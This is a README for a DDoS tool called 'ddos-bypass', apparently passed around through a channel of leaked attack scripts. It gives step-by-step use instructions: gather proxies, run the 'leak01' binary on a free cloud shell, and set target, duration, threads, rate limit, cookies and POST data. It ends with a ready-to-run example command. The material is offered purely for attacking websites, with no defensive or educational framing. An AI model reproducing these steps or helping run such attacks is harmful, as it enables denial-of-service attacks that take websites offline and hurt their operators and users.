# ddos-bypass
@nodejsleaks channel with leaks ddos scripts
So how do I use the method? First you must find a suitable proxy it can be any ip:port format. 🔥Then the server with which the attack will be carried out, for example cloud shell (free terminal), unpack the archive and enter the command chmod 777 *, after ./leak01 FREE
Let's see in detail how to enter the command
Key - Key in our case FREE
Method - GET / POST request method
Target - your target (website)
Time - attack time (seconds)
Threads - number of cores that will work 
Ratelimit - number of requests per second 
Proxy - your proxy file in *.txt format
Options: 
Cookie - input custom cookies
Referer - input custom referer
Sleep - number of delay in seconds
Postdata - custom postdata supports %RAND%
Example of use
./leak01 FREE GET/POST "target" time threads ratelimit proxy (options: --ref "target" --cookie ":" --sleep int --postdata ":")
./leak01 FREE GET "https://target.com" 300 4 8 list.txt --cookie "PHPSESSID=AJKSKD"
